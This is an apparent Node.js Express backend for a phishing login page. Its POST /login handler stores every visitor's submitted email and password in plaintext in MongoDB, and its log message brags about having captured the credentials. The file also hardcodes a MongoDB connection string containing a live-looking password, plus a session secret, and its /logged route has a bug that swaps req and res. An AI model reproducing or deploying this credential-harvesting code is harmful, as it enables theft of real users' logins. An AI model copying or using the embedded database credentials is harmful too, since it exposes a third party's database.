const express = require('express');
const session = require('express-session');
const User = require('./loginInfo');
const mongoose = require('mongoose');
const bodyParser = require('body-parser')

mongoose.connect('mongodb+srv://mazakamaz99:bGgNAS43b9KlL1M7@cluster0.wudnr1s.mongodb.net/?retryWrites=true&w=majority').then(()=> console.log('connected To database'))

const app = express();
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
  secret: 'mazenali00',
  resave: false,
  saveUninitialized: true
}));

app.get('/', (req, res) => {
    res.render('login');
});

app.get('/logged', (res, req) => {
    res.render('logged')
})

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    const logged = new User({
        Email: email,
        Password: password
    })
    
        logged.save().then(()=> {
            res.render('logged')
            console.log("AHHAHAHAHAHAHAH I GOT THE EMAIL AND PASSWORD MAN IM GREAT")
        })
    
        })        

    
;

app.listen('3000', () => {
    console.log('Server started at http://localhost:3000');
});
